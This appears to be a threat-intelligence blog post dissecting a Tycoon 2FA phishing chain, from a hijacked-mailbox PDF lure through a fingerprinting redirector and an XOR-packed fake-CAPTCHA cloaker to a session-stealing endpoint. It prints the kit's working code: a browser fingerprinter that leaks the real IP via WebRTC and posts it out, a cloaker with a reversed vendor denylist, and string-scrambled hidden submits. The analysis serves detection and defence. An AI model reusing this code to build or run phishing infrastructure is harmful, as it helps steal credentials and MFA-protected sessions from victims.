---
title: "Dissecting Tycoon 2FA: IP Reputation Gating, Path Tokens, and AiTM Session Theft"
date: '2026-06-06'
tags: ['tycoon-2fa', 'aitm-phishing', 'cloaking', 'javascript-deobfuscation', 'threat-intel', 'storm-1747', 'phishing', 'malware-analysis']
draft: false
---

# Dissecting Tycoon 2FA: IP Reputation Gating, Path Tokens, and AiTM Session Theft

A link landed in a corporate inbox, someone forwarded it to me asking if it was legit, and I ended up spending the better part of a day pulling apart one of the more disciplined phishing chains I have run into in a while. It was Tycoon 2FA underneath, which is interesting on its own, but the credential theft is not what made me want to write this up. It was the cloaking. Three separate gates stacked on top of each other, every one of them built on the assumption that someone like me would come looking, all designed to make sure the dangerous part never renders for an analyst, a scanner, or a sandbox.

I reversed all of it from static source and inert captures, then confirmed the family and the live endpoint in a sandbox. Everything here is reproducible, and I have left the code in so you can follow along. The only thing I redacted is the consulting firm whose mailbox got hijacked to send the thing, because that is a victim too and the account may still be live.

One principle up front. Reading an attacker's client-side code is analysis; letting their live server run its payload on a box you own is operating the attack. I kept those two separate, and I will flag the spot where that distinction really mattered.

## The chain at a glance

Six stages, and you have to clear every gate to see the next one.

1. A compromised Microsoft 365 mailbox sends an authenticated email. SPF, DKIM, DMARC all pass.
2. A Google Workspace themed PDF carries a link annotation to the first attacker host.
3. A redirector loads a fingerprinting script that profiles your browser, sniffs for analysis tooling, and leaks your real IP over WebRTC, then ships the profile to a collection endpoint.
4. A fake CAPTCHA runs an obfuscated cloaker. It checks your IP reputation, checks a per-victim path token, and only un hides itself if both pass. Fail either and you get bounced to a real shopping site.
5. Solving the puzzle fires a hidden POST. A Laravel backend runs a session state machine that only advances a real browser session.
6. The payload is a Tycoon 2FA adversary-in-the-middle endpoint that relays the Microsoft login and lifts the session token minted after MFA.

Now the detail.

## Delivery, and why the gateway never stood a chance

The email was a Google Workspace share notification, legal threat flavor. Unpaid invoices, a fake case number, an URGENT tag, a big blue DOWNLOAD DOCUMENT button. Run of the mill fear bait. What was not run of the mill was the authentication. I pulled the headers and the thing passed everything.

![The lure email as it landed in the mailbox. Sender, signature, and consulting firm name redacted. The Google Workspace themed PDF preview carries the URGENT tag and a fake CASE-2026 number, and the subject line leans hard on legal action over unpaid invoices. The matching authenticated headers are below.](/static/writeups/threat-intel/phishing/screenshot-2.png)

```
From: [REDACTED] <[redacted]@[redacted-consulting-domain]>
Return-Path: <[redacted]@[redacted-consulting-domain]>
Subject: RE : E-DOCUMENT SHARED ... Legal Action ... Unpaid Invoices
Authentication-Results: mx.google.com;
    dkim=pass header.i=@[redacted].onmicrosoft.com ...
    arc=pass (i=1 spf=pass dkim=pass dmarc=pass);
    spf=pass (designates 2a01:111:f403:c408::1 as permitted sender);
    dmarc=pass (p=REJECT sp=REJECT)
Received: from ...outbound.protection.outlook.com (...[2a01:111:f403:c408::1])
```

This is not a spoof. It is a genuinely authenticated message sent from inside a real, compromised tenant through Microsoft 365 outbound infrastructure. DMARC sitting at p=REJECT bought nothing, because there was nothing to reject. The mail was real. The RE prefix is the giveaway for a thread hijack from a mailbox the attacker already owns.

If you take one operational lesson from this whole writeup, take this one. Authenticated mail from a trusted partner is not the same as safe mail. The trust model assumes the sender is who the headers say. It does not assume the sender's account got popped last week.

## The PDF, and finding the real link

The button did not link anywhere obvious. It sat inside a PDF dressed as another Google Workspace page, and the actual destination was buried in a `/URI` link annotation. Quickest way to get it is to read the annotations straight out of the PDF object structure and sweep the decompressed streams for good measure.

```python
import re, zlib
raw = open("CASE-2026...pdf","rb").read()

for u in dict.fromkeys(re.findall(rb'/URI\s*\(([^)]*)\)', raw)):
    print(u.decode('latin-1'))

def inflate_all(data):
    out = data
    for m in re.finditer(rb'stream\r?\n(.*?)\r?\nendstream', data, re.S):
        try: out += b"\n" + zlib.decompress(m.group(1))
        except Exception: pass
    return out
```

```
https://screech741.cleatpeak.co.uk/incarceration914/
```

One annotation, one host. That is the front door.

## Layer one, the redirector that profiles you first

The first host barely renders anything. It loads one script and feeds it the next hop through a `data-u` attribute.

```html
<script src="vendor.9f65bf6b.js?v=5da2b5ce"
        data-u="https://filesx.cleatpeak.co.uk/incarceration914/"></script>
```

I pulled `vendor.9f65bf6b.js` with curl and read it. About 5 KB, not even obfuscated, and this is where I started respecting whoever built this. It is a fingerprinting and gating engine wearing an analytics costume. Trimmed for length, behavior intact (helpers like `read()` and `addHidden()` elided, they do exactly what the names say):

```javascript
(function(w, d) {
  var el  = d.currentScript || (function(){ var s=d.getElementsByTagName("script"); return s[s.length-1]; })();
  var cfg = (el.getAttribute("data-u") || "").replace(/\\/g, "") || location.href;   // next hop
  var path = (el.getAttribute("data-p") || "").replace(/\\/g, "");
  var data = {}, errors = [], aborted = false;

  // anti-sandbox timing. background or close the tab and it never submits.
  w.addEventListener("pagehide", function(){ aborted = true; });
  d.addEventListener("visibilitychange", function(){
    if (d.visibilityState === "hidden") aborted = true;
  });

  function collect() {
    data.screen    = read(w.screen);
    data.navigator = read(w.navigator);
    data.window    = read(w);
    data.console   = read(w.console);
    data.timezoneOffset = (new Date).getTimezoneOffset();

    try { data.frame = w.self !== w.top; } catch (e) { data.frame = true; }       // iframed?
    try { data.touchEvent = d.createEvent("TouchEvent").toString(); } catch (e) {} // real device?

    // devtools detection. logging an object makes the console stringify it.
    // if devtools is open, the toString fires and the counter ticks up.
    try {
      var fn = function(){}, cnt = 0;
      fn.toString = function(){ ++cnt; return ""; };
      console.log(fn);
      data.tostring = cnt;
    } catch (e) {}

    // GPU string. SwiftShader / llvmpipe / virtio scream virtual machine.
    try {
      var gl  = d.createElement("canvas").getContext("webgl");
      var ext = gl.getExtension("WEBGL_debug_renderer_info");
      data.webgl = { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL),
                     renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
    } catch (e) {}

    // prototype tamper probe. trips if something hooked a built in.
    (function(){
      var orig = Array.prototype.includes;
      Array.prototype.includes = function(){ data.proto = true; };
      try { d.createElement("video").canPlayType("video/mp4"); } catch (e) {}
      Array.prototype.includes = orig;
    })();
  }

  // WebRTC IP leak. reaches past a VPN to the real address via Google STUN.
  function net(cb) {
    var RTC = w.RTCPeerConnection || w.webkitRTCPeerConnection || w.mozRTCPeerConnection;
    if (!RTC) return cb();
    try {
      var pc = new RTC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
      var tm = setTimeout(done, 120);
      data._rtc = [];
      pc.createDataChannel("");
      pc.onicecandidate = function(e){
        if (e.candidate) {
          var p = e.candidate.candidate.split(" ");
          if (p.length >= 5) data._rtc.push({ i: p[4], t: p[7], p: p[2] });  // ip, type, proto
        } else { clearTimeout(tm); done(); }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
      function done(){ try { pc.close(); } catch (x) {} cb(); }
    } catch (e) { cb(); }
  }

  // exfil. hidden POST to data-u carrying the whole profile.
  function send() {
    var hash = location.hash || "";
    collect();
    net(function(){
      if (aborted) return;
      var f = d.createElement("form");
      f.method = "POST"; f.action = cfg; f.style.display = "none";
      addHidden(f, "analytics", JSON.stringify(data));   // the fingerprint
      addHidden(f, "_h", hash);
      addHidden(f, "_p", path);
      (d.body || d.documentElement).appendChild(f);
      f.submit();
    });
  }
  function init(){ if (d.body) send(); else setTimeout(init, 10); }
  init();
})(window, document);
```

Break down what it is actually doing. It collects a wide fingerprint: screen, navigator, timezone, the usual. Then it goes hunting for analysts. The `console.log` toString counter is a neat devtools detector, because an open inspector eagerly stringifies logged objects and bumps the count. The `frame` check catches iframing. The WebGL renderer string outs virtual machine graphics stacks. The `Array.prototype.includes` swap catches anything hooking built in methods. And then the real flex, a WebRTC connection to Google's public STUN server to pull the actual client IP, which routinely defeats a VPN.

Everything gets packed into a hidden form and POSTed to the next hop under a field named `analytics`. The `pagehide` and `visibilitychange` abort flags mean a sandbox that loads the page in the background never even submits. This is not telemetry. It is a bouncer that decides whether you look like a victim or a researcher before it lets you walk to the next door.

The build trailer is a nice clustering handle for hunting other samples from the same kit:

```
/*! b69840dbb1f04a59f97dbd79436270dc */
/* build:b43e09cb43d7fb3f */
```

## Layer two, the fake CAPTCHA is theater

Now the centerpiece. The next host, `sudrosi.contractors`, serves a fake CAPTCHA. I saw three distinct response shapes across the captures I pulled. Two are CAPTCHA skins, an image grid ("select all squares with bicycles") and a type the code "Human Check" box, both wrapping the same packer and cloaker underneath. The third is a fully styled NOSPARTS car-parts storefront returned when the path normalisation differs (no trailing slash), with `body { display:none !important; }` set at the top and a second XOR-packed stage at the bottom. Same packer pattern, smaller payload, served as a decoy. Even the off-ramp wears the costume. I will get to the decoy stage shortly. The CAPTCHA puzzle is pure theater. Nothing you do in it is validated server-side until later.

![The "Human Check" skin, one of the CAPTCHA disguises this kit ships. The per-victim path with the literal `!` is visible in the address bar, which means this single frame captures evidence for both client side gates. The puzzle is decorative. Nothing the visitor types here is checked until the hidden POST fires.](/static/writeups/threat-intel/phishing/screenshot-1.png)

### The packer

Each page ships a base64 blob plus a short base64 key, XORs them together, and runs the result through `new Function`.

```javascript
function lo(b){ return Uint8Array.from(atob(b), c => c.charCodeAt(0)); }
let kp = "...blob...", vs = "...16-byte key...";
let rd = lo(kp), qw = lo(vs), bf = new Uint8Array(rd.length);
for (let i = 0; i < rd.length; i++) bf[i] = rd[i] ^ qw[i % qw.length];
(new Function(new TextDecoder().decode(bf)))();
```

You never need to run that. Decode it statically:

```python
import base64
def xordec(blob_b64, key_b64):
    b = base64.b64decode(blob_b64); k = base64.b64decode(key_b64)
    return bytes(b[i] ^ k[i % len(k)] for i in range(len(b))).decode('utf-8','replace')
print(xordec(kp, vs))
```

![Deobfuscation pipeline: the page ships a base64 blob and a base64 key. Decoding both with atob gives raw bytes, a repeating XOR of blob against key recovers the UTF-8 JavaScript source, and the kit feeds that to new Function to execute it. Decoding statically lets you read the cloaker without running it.](/static/writeups/threat-intel/phishing/tycoon2fa-deobfuscation.svg)

The flow is four steps and none of them need a live browser. Two base64 strings come down with the page, you decode both, XOR the blob against the repeating key, and you are holding the cloaker's source. In the wild the kit hands that string to `new Function` to run it. On my bench it goes to a print statement instead.

Each page ships a multi-kilobyte base64 blob and a 16-byte base64 key. Variable names rotate per sample (`ha`/`ac`, `kp`/`vs`, `hm`/`rs`, `tu`/`vu`, `jv`/`fq` across the five samples I captured), but the structure is identical and every refresh of the same URL rolls a fresh key and re-encrypts the same logical payload. Full untruncated blobs, keys, and SHA256s for all six samples are linked at the end of this article.

### What the blob actually is

Here is the unpacked cloaker. The comments are mine.

```javascript
!function(){
  var redirectHandler = "https://www.cdiscount.com",   // decoy, rotates per sample
      // reversed ASN / provider denylist. reverse each token to see the intended hit:
      // bewesael        -> leaseweb
      // 742m            -> m247
      // nsl             -> lsn
      // naecolaigtid    -> ditgialocean   (operator typo, intended digitalocean)
      // edonil          -> linode
      // nozama          -> amazon
      // swa             -> aws
      // hvo             -> ovh
      // rentzteh        -> heztner        (operator typo, intended hetzner)
      // elgoog          -> google
      // tfosorcim       -> microsoft
      // eralfduolc      -> cloudflare
      // teneralfduolc   -> cloudflarenet
      // 53331sa         -> as13335        (Cloudflare's main ASN, no typo)
      // iamaka          -> akamai
      // yltsaf          -> fastly
      reversedList = "bewesael,742m,nsl,naecolaigtid,edonil,nozama,swa,hvo,rentzteh,elgoog,tfosorcim,eralfduolc,teneralfduolc,53331sa,iamaka,yltsaf".split(",");
  var isDone = false;

  document.documentElement.style.visibility = "hidden";   // hide on load

  // if no decision in 10s, bail to the decoy
  var timerRef = setTimeout(function(){
    if(!isDone){ isDone = true; location.replace(redirectHandler); }
  }, 10000);

  fetch("https://api.ipapi.is/", {cache:"no-store"})       // reputation lookup
  .then(r => r.json())
  .then(data => {
    if(isDone) return; isDone = true; clearTimeout(timerRef);
    var full = JSON.stringify(data).toLowerCase();

    // GATE 1: reputation. reverse each token and test for a substring match.
    var isBlocked = reversedList.some(x => full.includes(x.split("").reverse().join("")));
    if(!data || isBlocked) return location.replace(redirectHandler);   // datacenter -> decoy

    // GATE 2: per-victim path token. the "!" is templated in per build.
    const specialChars = ("!" || '').split(',').map(c=>c.trim()).filter(Boolean);
    const seg = window.location.pathname.split('/').filter(Boolean)[0] || '';
    const esc = s => s.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    if (specialChars.length > 0) {
      const pattern = new RegExp(specialChars.map(esc).join('|'));
      if (pattern.test(seg)) {                              // token present -> REVEAL
        document.documentElement.style.visibility = "visible";
        document.body.style.display = "flex";
      } else {
        window.location.replace(redirectHandler);           // token absent -> decoy
      }
    } else {
      document.documentElement.style.visibility = "visible";
      document.body.style.display = "flex";
    }
  })
  .catch(function(){
    if(isDone) return; isDone = true; clearTimeout(timerRef);
    location.replace(redirectHandler);
  });
}();
```

Two gates, both in clear text once you strip the wrapper.

Gate one is network reputation. It asks `api.ipapi.is` what kind of network you are on, lowercases the JSON, and tests it against a denylist of hosting and security provider names that the author wrote backwards in the source so a grep does not catch them. Two of the tokens in this denylist are subtly broken: `naecolaigtid` reverses to `ditgialocean` rather than `digitalocean`, and `rentzteh` reverses to `heztner` rather than `hetzner`. Those are operator typos. They mean a researcher coming in from a DigitalOcean or Hetzner box would not get caught by this exact denylist unless ipapi happens to return a string that matches the misspelling, but the typos survive byte-for-byte in YARA rules keyed on the shipped tokens. Outside the two typos, datacenter, cloud, or vendor traffic lands on the decoy and never sees the trap. (There is a separate, slightly weirder ipapi behavior I hit in testing involving the `is_datacenter` boolean; honest caveat on that lives in Field notes.)

Gate two is a per-victim path token. It tests the first path segment against a templated regex. In these builds the discriminator is a literal exclamation mark, and the real victim path is `entAyO6wFocW!1XPO`. Guess the URL without the token and you bounce.

The decoy rotated by region across the samples I pulled. ASOS, eMAG for Romania, Cdiscount for France, an IKEA redirect on one storefront skin, and Zalando in the sandbox run. They localize the cover site so nothing looks out of place for the visitor's country. Nice touch, and a good reminder that the decoy is part of the disguise, not a mistake.

### The decoy is also packed

The third response shape I mentioned, the NOSPARTS car-parts storefront, is not just a static cover page. It uses the same hide-on-load posture and ships its own XOR-packed second stage at the bottom. Same shape as the CAPTCHA cloaker, smaller payload, different variable names.

```javascript
// bottom of the NOSPARTS decoy page, sudrosi.contractors
function n0(q6) {
    let g4 = atob(q6);
    return Uint8Array.from(g4, y7 => y7.charCodeAt(0));
}
let a6 = "XSPRwMi17UtNevph80xW5BMmxdrCruoKUTejdpgPE6BeLdDa27K+CwwlpG3XBR3tHWvHwcbjrR8pL/szwg==";
let n5 = "fEWkrqvBhCQjUtMa+Wx2iA==";
let i4 = n0(a6), y4 = n0(n5), d1 = new Uint8Array(i4.length);
for (let u9 = 0; u9 < i4.length; u9++) d1[u9] = i4[u9] ^ y4[u9 % y4.length];
(new Function(new TextDecoder().decode(d1)))();
```

The blob is short enough to include whole. Decode it through the same `xordec` and you get a single line of JavaScript:

```javascript
location.replace("https://www.ikea.com");
```

That is the punchline. The IKEA redirect I mentioned in the decoy rotation earlier is not a server side 302 and it is not even a plain `location.replace` call sitting in the open. It is itself a packed payload, served inside a fully-styled fake retailer page, that decodes at runtime to push the visitor away. The cloaking is recursive in a way I would not have predicted from one capture: even the off-ramp, the part that exists only to look boring, runs through the same atob+XOR envelope as the gate it is hiding from. For hunting that matters too: a YARA rule keyed on the packer pattern will hit the decoy as well as the cloaker, which is good for coverage and a little surprising for triage.

Put the two client-side gates together with the server-side session check from the next section and you get the full decision tree the kit walks for every visitor. It is worth seeing as one picture, because the thing that makes this kit nasty is not any single check, it is that all three stack and every one of them fails closed.

![Decision tree of the three gates. A visitor lands on the CAPTCHA and the page hides itself. Gate 1 checks IP reputation via api.ipapi.is and dumps datacenter or cloud or vendor traffic to a geo decoy. Gate 2 checks for the per-victim path token and bounces anyone without it to the decoy. Gate 3 is the Laravel session state check, which traps cold scripted requests in an infinite reload loop. Only a visitor that passes all three reaches the Tycoon 2FA payload.](/static/writeups/threat-intel/phishing/tycoon2fa-gates.svg)

I am putting gate three in this picture even though it lives a layer deeper, because you cannot reason about the cloaking without it. The first two gates sort you on the client. The third one sorts you on the server, and it is the one that quietly defeated my early replay attempts.

### The hidden submit

Both skins build a hidden form whose tag and field names are assembled from scrambled strings, so the words form, input, hidden, POST, and submit never appear literally in the source.

```javascript
const tk = "---mrof---".slice(3, 7).split("").reverse().join("");        // "form"
const iw = "t-u-p-n-i".split("-").reverse().join("");                     // "input"
const jj = "999neddih111".substring(3, 9).split("").reverse().join("");   // "hidden"
const fp = [..."X P O S T Y"].filter(c => c !== " " && !"XY".includes(c)).join(""); // "POST"

const fu = Object.assign(document.createElement(tk), { id:"rEbYSluMrA", method:fp });
fu.appendChild(Object.assign(document.createElement(iw),
              { type:jj, name:"zone", id:"VODYToMfaG", value:"" }));
document.body.appendChild(fu);

// submit() is also built from first letters:
// ['summary','user','box','media','index','task'].map(w=>w[0]).join('') === "submit"
document.getElementById('rEbYSluMrA')[
  ['summary','user','box','media','index','task'].map(w=>w[0]).join('')
]();
```

Solve the puzzle and that empty `zone` field POSTs back to the current URL. That POST is the handoff to the server-side stage. The whole CAPTCHA exists to look normal and to trigger that one submission.

## Layer three, the server makes you prove you are a browser

Right network and right path still are not enough. The backend is Laravel and it runs a session state machine. A cold scripted POST, even with the correct token, gets a reload stub and nothing else.

Housekeeping: paths shown below are normalized to the real victim path `entAyO6wFocW!1XPO/`. My actual captures hit `entAyO6wFocWiwconfigXPO/` (the bash history-expansion artifact described in Field notes), but the server returned the same reload stub for both. Layer three's gate is session state, not the path.

A cold scripted POST with no session gets back fresh `XSRF-TOKEN` and `laravel_session` cookies and a one-line reload script, every time. Three back-to-back POSTs give three fresh sessions and the same body. The server is not even pretending. It hands you a session, then asks you to use it to ask again.

So I tried the obvious next step. Hold the cookies in a jar and reuse them so the second request carries a session the server has already issued.

```bash
$ JAR=$(mktemp)
$ URL='https://sudrosi.contractors/entAyO6wFocW!1XPO/'
$ UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...'

# seed the jar
$ curl -s -c "$JAR" -A "$UA" "$URL" -o /tmp/stage_get.html
$ cat "$JAR"
#HttpOnly_sudrosi.contractors  FALSE  /  TRUE  ...  laravel_session  eyJpdiI6...
sudrosi.contractors            FALSE  /  TRUE  ...  XSRF-TOKEN       eyJpdiI6...

# replay the POST with the seeded session
$ curl -i -s -c "$JAR" -b "$JAR" -A "$UA" -X POST "$URL" --data 'zone=' \
    -H "Referer: $URL"

HTTP/1.1 200 OK
Set-Cookie: XSRF-TOKEN=eyJpdiI6...           # rotated, not the one I sent
Set-Cookie: laravel_session=eyJpdiI6...      # rotated, not the one I sent
<script>window.location.href = window.location.pathname + window.location.search;</script>
```

Same stub. The server rotated both cookies again, ignored the ones I sent back, and returned the reload script. The gate is not "send me a cookie I issued." It is "advance through a sequence of states only a real browser walking the page would advance through." Cookies are the receipt, not the credential. Whatever the Laravel controller is keying on, it expects something to happen between issue and replay that `curl` cannot fake. Without that, you are parked in the reload loop forever, and nothing about the next stage leaks.

## Where I drew the line

This is the spot I flagged at the top. To pull the final payload by hand from here, I would have had to drive a live browser all the way through the gates and let the attacker server deliver whatever it wanted straight to my session. I do not do that. Reading their code is one thing. Talking their live infrastructure into running its payload on a machine is operating the attack, and there is no good reason to take that risk when a sandbox does the same job from inside a contained environment with provenance I can cite.

So I stopped grinding on the live session and let ANY.RUN do the dangerous part.

## Detonation, and the reveal

I dropped the original victim URL into ANY.RUN and let a real browser walk the chain.

![ANY.RUN verdict for the original lure URL. Family tagged as Tycoon 2FA, cluster Storm-1747, with fingerprinting, phishing, qrcode, and phishing-ml tags lining up with what the static analysis predicted. The whole chain resolved in 78 seconds.](/static/writeups/threat-intel/phishing/screenshot-5.png)

- Verdict: Malicious activity
- Family: Tycoon 2FA
- Tags: fingerprinting, phishing, tycoon, storm1747, phishing-ml, qrcode
- Task: app.any.run/tasks/fd5f16a5-1893-4567-a7b2-4047fada1234

Tycoon 2FA is phishing as a service, a kit you rent, built to bypass MFA on Microsoft 365 and Gmail. As a family it runs as an adversary-in-the-middle, sitting between the victim and the real login, relaying credentials and lifting the session token that gets issued after the MFA challenge passes. That is the dangerous part of the kit in general: a victim who does everything right, taps approve on a legitimate prompt, and the attacker still ends up holding a valid session. I did not drive a live browser into the final login panel for this writeup, so what I am reporting from the sandbox is the family attribution and the chain of requests up to the malicious endpoint, not a captured login form. The storm1747 tag ties it to the cluster Microsoft tracks for this kit. The qrcode tag is consistent with Tycoon's known QR-driven device-pivot move (pushing the victim onto a personal phone where corporate monitoring is blind) and not a confirmation that I saw a QR element rendered on the page.

Watching the network log was satisfying because every layer I had reversed fired in order.

```
GET  screech741.cleatpeak.co.uk/incarceration914/            200  501 b    redirector
POST mz.cleatpeak.co.uk/incarceration914/                    200  1.03 Kb  fingerprint exfil
GET  screech741.cleatpeak.co.uk/.../vendor.9f65bf6b.js       200           the collector
GET  sudrosi.contractors/entAyO6wFocW!1XPO/                  200  9.77 Kb  CAPTCHA, note the !
GET  api.ipapi.is/                                           200  1.90 Kb  reputation beacon
POST sudrosi.contractors/entAyO6wFocW!1XPO/                  200  90 b     solved CAPTCHA handoff
GET  www.zalando.lu/   ...                                   302/200       geo decoy
GET  dacharo.com/cyberia~qmanl                               200  1 b      MALICIOUS, Tycoon endpoint
```

That 90 byte POST is the exact submission I kept hitting the reload stub on. In a real session it advanced. The `mz.cleatpeak.co.uk` POST is `vendor.js` shipping its fingerprint to a sibling host I had not seen until the live run. Reconciling this with the static analysis: `vendor.js` reads its destination from the `data-u` attribute on its own script tag, which points at `filesx.cleatpeak.co.uk`. The sandbox network log shows the actual exfil hitting `mz.cleatpeak.co.uk` instead, which means either `filesx` forwarded server side to `mz`, or the live page injected a `vendor.js` whose `data-u` was rewritten to `mz` at delivery time. I did not capture both halves of that handoff, so I am noting the discrepancy rather than picking one explanation.

And buried in over 350 requests, the sandbox scored exactly one connection as malicious.

```
GET dacharo.com/cyberia~qmanl  ->  81.28.12.12 (GCORE, LU)  1 byte  reputation: MALICIOUS
```

![The actual malicious request captured by the sandbox. Origin `sudrosi.contractors` confirms this fires from the fake CAPTCHA page, and the GET to `/cyberia~qmanl` on `dacharo.com` matches the Tycoon 2FA tilda URL pattern the detection rules know on sight. This single request is the thing the entire kit exists to protect.](/static/writeups/threat-intel/phishing/screenshot-4.png)

That host sits off to the side of the visible chain, returns almost nothing, and matches the Tycoon URL pattern the detection rules know on sight. That is the malicious endpoint the chain hands off to, the thing this entire machine exists to protect. The fake puzzle, the bouncer script, the decoys, all of it wraps around that one quiet request. I did not navigate further than the request itself, the URL and Suricata verdict are the strongest evidence I have for what sits behind it.

The behavioral alerts line up with the static analysis. The three that add information beyond the HTTP log itself:

```
SUSPICIOUS [ANY.RUN] FingerprintJS Collected Data observed in HTTP POST request
INFO [ANY.RUN] Google STUN server DNS query observed (stun.l.google.com)
Attempted PHISHING [ANY.RUN] Tycoon2FA related URL pattern observed (tilda-variant)
```

The fingerprint POST, the WebRTC STUN leak, and the tilda-variant Tycoon URL show up exactly where the code said they would.

## The whole chain in one picture

![Tycoon 2FA fake CAPTCHA kill chain: a compromised M365 mailbox sends an authenticated PDF lure, which leads to a fingerprinting redirector, then a fake CAPTCHA cloaker with three fail-closed gates (IP reputation, per-victim path token, Laravel session state), and finally the Tycoon 2FA adversary-in-the-middle endpoint that steals the post-MFA session token. Any failed gate diverts to a geo-localized retail decoy.](/static/writeups/threat-intel/phishing/tycoon2fa-killchain.svg)

*Every box you see is a checkpoint the visitor has to clear. Miss any one of the three gold gates and you get shunted off to a real shopping site instead. The red path is the only one that reaches the payload, and it only opens for a victim who looks exactly right.*

## Field notes, things the writeups do not tell you

Three snags from this analysis worth saving for the next replay.

The exclamation mark. The victim path has a literal `!` in it. Bash treats `!` as history expansion, so every time I pasted `entAyO6wFocW!1XPO` my own shell quietly rewrote it, turning `!1` into a previous command and mangling the path into nonsense. At one point it expanded into `iwconfig`, of all things, which sent me down a rabbit hole convinced the path gate was unbeatable. The gate was fine. My terminal was sabotaging me. Single quote your URLs, or run `set +H` to kill history expansion, before you replay anything with special characters in it.

Gate 2 is JavaScript, not the web server. I noticed this only when I went back through my own captures. Almost every `curl` I ran in this analysis hit `entAyO6wFocWiwconfigXPO/`, the bash-mangled path, and the server still returned the full CAPTCHA HTML every time. Only the final cookie jar test used the correctly quoted `entAyO6wFocW!1XPO/`. That tells you the path token gate is enforced entirely client side, by `window.location.pathname.split('/').filter(Boolean)[0]` inside the decoded cloaker. The web server happily serves the cloaker HTML for any path under `sudrosi.contractors`. Fetch with `curl` and never execute JavaScript and you never trip Gate 2, you just get the obfuscated source. Useful for collecting samples without negotiating the gates, and a small refinement of the picture: of the three gates, the first two are entirely client side and the only server side enforcement is the session state check in Layer three.

The ipapi false positive, with the honest caveat. I tested from a genuinely residential local mobile carrier, real ISP, low abuse score, and the cloaker still refused me. I then pulled the same `api.ipapi.is` response the cloaker fetches from two different local mobile carriers back to back. Both responses cleanly hit zero entries in the reversed denylist. The only field that differed between them was `is_datacenter`, and the flip lined up one for one with the cloaker's decision to reveal versus bounce.

```text
# carrier A
IP flags hit: NONE (clean)
is_datacenter: false
type: "isp"
verdict observed: cloaker REVEALED on this network

# carrier B
IP flags hit: NONE (clean)
is_datacenter: true                  <-- ipapi false positive on a residential mobile range
type: "isp"
verdict observed: cloaker BOUNCED to decoy
```

Honest caveat on the mechanism. The decoded cloaker excerpt earlier in this article only implements the reversed-name substring test. It does not visibly read the `is_datacenter` boolean as its own field. So either the cloaker variant I decoded was a trimmed copy of a longer gate-1 check that does key on that field, or some string in carrier B's response happened to match a denylist token through an indirect path I did not enumerate. From my evidence I cannot tell which. What I can say cleanly is that ipapi flipping `is_datacenter` to true correlated one for one with the bounce in my testing. The operational lesson holds either way: before you blame your setup, check what the IP intel API actually says about your egress.

## MITRE ATT&CK

| Tactic | Technique | ID | In this chain |
|---|---|---|---|
| Resource Development | Compromise Accounts: Email Accounts | T1586.002 | hijacked consulting mailbox |
| Initial Access | Phishing: Spearphishing Link | T1566.002 | link in the PDF |
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 | the PDF lure |
| Initial Access | Valid Accounts: Cloud Accounts | T1078.004 | authenticated send from the compromised tenant |
| Initial Access | Internal Spearphishing | T1534 | mail from a real, trusted business account |
| Execution | User Execution: Malicious Link | T1204.001 | victim clicks through |
| Defense Evasion | Obfuscated Files or Information | T1027 | atob + XOR + new Function, scrambled keywords |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | runtime XOR then new Function |
| Defense Evasion | Execution Guardrails: Environmental Keying | T1480.001 | per-victim "!" path token |
| Defense Evasion | Virtualization/Sandbox Evasion: System Checks | T1497.001 | WebGL, iframe, devtools, prototype probes |
| Defense Evasion | Virtualization/Sandbox Evasion: Time Based Evasion | T1497.003 | pagehide/visibilitychange abort, 10s timeout |
| Defense Evasion | Impersonation | T1656 | Google Workspace and legal notice theming |
| Reconnaissance | Gather Victim Network Information | T1590 | WebRTC STUN leak, ipapi lookup |
| Discovery | System Information Discovery | T1082 | screen, navigator, timezone, GPU fingerprint |
| Collection | Adversary in the Middle | T1557 | Tycoon relay between victim and provider |
| Credential Access | Steal Web Session Cookie | T1539 | post-MFA session token theft |
| Credential Access | Multi-Factor Authentication Interception | T1111 | the entire purpose of Tycoon 2FA |

## IOCs

Live malicious hosts defanged. The decoys are real, legitimate sites used as cover, so do not block them.

**Infrastructure**
```
screech741[.]cleatpeak[.]co[.]uk      redirector + vendor.js        188.114.96.3 / .97.3 (Cloudflare)
filesx[.]cleatpeak[.]co[.]uk          data-u exfil target (static analysis)
mz[.]cleatpeak[.]co[.]uk              observed fingerprint POST target (sandbox)
sudrosi[.]contractors                 fake CAPTCHA cloaker           192.227.220.17 (AS-COLOCROSSING, behind Cloudflare)
dacharo[.]com/cyberia~qmanl           Tycoon 2FA endpoint, MALICIOUS 81.28.12.12 (GCORE, LU)
api[.]ipapi[.]is                      reputation beacon used by kit  49.12.45.212 (Hetzner, DE)
stun[.]l[.]google[.]com:19302         WebRTC IP leak (Google STUN abused)
```

**Paths**
```
/entAyO6wFocW!1XPO/    per-victim path, literal "!" is the gate discriminator
/incarceration914/     redirector path
```

**Decoys (legitimate, do not block)**
```
asos.com, emag.ro, cdiscount.com, ikea.com, zalando.lu, images.unsplash.com
```

**Static artifacts**
```
Cloaker payload pairs (b64 key + SHA256 of base64 blob, full untruncated blobs in linked gist):
  key MEv57C7KAhenuWeyL83eSA==   form id TITfbIZxPa   sha256 3a760bf5d7e659aceb26b73414b3813bd1c0615d7ca5e16a9982ccfc6023562c
  key Qmn1tiHq+tuAqdROmcJi9Q==   form id eKOMPyjwTI   sha256 370e2dda2db6d4a782bd7cda8b0cd40b63ef9a4392edfc50f556a5daf346c079
  key EZniYaSuWgTvGfrmnstZRw==   form id cLOWXDAwyF   sha256 1aa97c978da9bac5c51c8bfda275ceba04bd321139949d6dd84ef1e6de4c1aab
  key hMCsvzUGKyLfhwj40QK/WQ==   form id aYHOEckKcB   sha256 669fc36ca3ba7d0fc0ad47cd2f7462c9e79158505965b886d6d260054aa042ad
  key iAxytUkKvaobKJcEiZo+EA==   form id rEbYSluMrA   sha256 58f6d366b1236038babe1a3d100c5dd728d477c61271d94515729322253c96cb
NOSPARTS decoy nested stage:
  key fEWkrqvBhCQjUtMa+Wx2iA==   sha256 cb8714048d541b4ab8f1bd009c4f5018686d41c27ba7d1328617a460c950a5bf
Input ids:       MaGEotByIn, ohseXOHFyX, FxRrBXZcdI, dSZpUWsTJA, VODYToMfaG
Field names:     zone (CAPTCHA submit)   analytics / _h / _p (fingerprint POST)
